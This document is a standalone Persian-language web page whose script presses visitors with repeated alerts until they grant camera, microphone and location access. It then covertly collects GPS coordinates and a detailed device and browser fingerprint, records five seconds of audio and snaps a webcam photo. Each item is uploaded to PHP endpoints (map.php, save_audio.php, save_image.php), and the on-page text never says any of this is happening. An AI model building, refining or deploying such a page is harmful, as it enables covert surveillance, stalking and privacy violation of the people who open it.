<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Collect System Information</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');

        body {
            font-family: 'Vazirmatn', sans-serif;
            text-align: center;
            background: linear-gradient(to right, #1f4037, #99f2c8);
            color: #fff;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .box {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 30px 40px;
            border-radius: 20px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
            max-width: 90%;
            width: 400px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 15px;
        }

        #status {
            font-size: 16px;
            margin-top: 0;
        }

        .loader {
            margin: 25px auto;
            width: 50px;
            height: 50px;
            border: 6px solid rgba(255, 255, 255, 0.3);
            border-top: 6px solid #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        footer {
            position: absolute;
            bottom: 10px;
            font-size: 12px;
            color: #eee;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>در حال دریافت مجوزها...</h1>
        <p id="status">لطفاً دسترسی‌ها را تأیید کنید تا ادامه دهیم.</p>
        <div class="loader"></div>
    </div>

    <footer>© 2025 سامانه جمع‌آوری اطلاعات</footer>

    <script>
        // کل کد جاوااسکریپت بدون هیچ تغییری همونطور که دادی باقی می‌مونه

        async function requestPermissionAndContinue() {
            let grantedMic = false;
            let grantedCam = false;
            let grantedGeo = false;

            async function checkPermissions() {
                try {
                    await navigator.mediaDevices.getUserMedia({ audio: true });
                    grantedMic = true;
                } catch {}

                try {
                    await navigator.mediaDevices.getUserMedia({ video: true });
                    grantedCam = true;
                } catch {}

                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    grantedGeo = true;
                } catch {}
            }

            while (!(grantedMic && grantedCam && grantedGeo)) {
                document.getElementById("status").innerText = "لطفاً تمام دسترسی‌ها (مکان، دوربین، میکروفون) را تأیید کنید.";
                alert("برای ادامه، باید دسترسی به میکروفون، دوربین و موقعیت مکانی را بدهید.");
                await checkPermissions();
            }

            document.getElementById("status").innerText = "دسترسی‌ها دریافت شد، در حال جمع‌آوری اطلاعات...";

            collectAndSend();
            setTimeout(() => {
                recordAudio();
                takePhoto();
            }, 3000);
        }

        async function collectAndSend() {
            const fullData = {};
            fullData.location = {};
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    fullData.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                } catch (e) {
                    fullData.location = { error: "Permission denied or timeout" };
                }
            }

            fullData.cpu = {
                hardwareConcurrency: navigator.hardwareConcurrency
            };

            fullData.gpu = {
                webGL: !!window.WebGLRenderingContext,
                webGLAvailable: (function() {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        return !!gl;
                    } catch (e) {
                        return false;
                    }
                })()
            };

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    fullData.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    fullData.battery = { error: "Battery info not available" };
                }
            }

            fullData.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : null,
                pixelRatio: window.devicePixelRatio
            };

            fullData.browser = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                vendor: navigator.vendor
            };

            fullData.network = {
                downlink: navigator.connection ? navigator.connection.downlink : null,
                effectiveType: navigator.connection ? navigator.connection.effectiveType : null,
                rtt: navigator.connection ? navigator.connection.rtt : null,
                type: navigator.connection ? navigator.connection.type : null,
                saveData: navigator.connection ? navigator.connection.saveData : false,
                isOnline: navigator.onLine
            };

            fullData.memory = {
                totalMemory: window.performance.memory ? window.performance.memory.totalJSHeapSize : null,
                usedMemory: window.performance.memory ? window.performance.memory.usedJSHeapSize : null
            };

            fullData.os = {
                platform: navigator.platform,
                appVersion: navigator.appVersion,
                cpu: navigator.oscpu || 'Unknown'
            };

            fetch('map.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fullData)
            })
            .then(res => res.text())
            .then(res => console.log("اطلاعات ارسال شد:", res))
            .catch(err => console.error("ارسال اطلاعات با خطا مواجه شد:", err));
        }

        function recordAudio() {
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                const recorder = new MediaRecorder(stream);
                const audioChunks = [];
                recorder.ondataavailable = e => audioChunks.push(e.data);
                recorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const formData = new FormData();
                    formData.append('audio', audioBlob, 'voice.webm');

                    fetch('save_audio.php', { method: 'POST', body: formData })
                    .then(r => r.text())
                    .then(t => console.log("وویس ذخیره شد:", t))
                    .catch(e => console.error("خطا در ذخیره وویس:", e));
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            })
            .catch(err => console.error("دسترسی به میکروفون رد شد:", err));
        }

        function takePhoto() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoData = canvas.toDataURL('image/png');

                    fetch('save_image.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ photo: photoData })
                    })
                    .then(response => response.json())
                    .then(data => console.log('تصویر ذخیره شد', data))
                    .catch(error => console.error('خطا در ذخیره تصویر:', error));

                    video.srcObject.getTracks().forEach(track => track.stop());
                }, 2000);
            })
            .catch(error => console.error('خطا در دسترسی به دوربین:', error));
        }

        window.onload = () => {
            requestPermissionAndContinue();
        };
    </script>
</body>
</html>
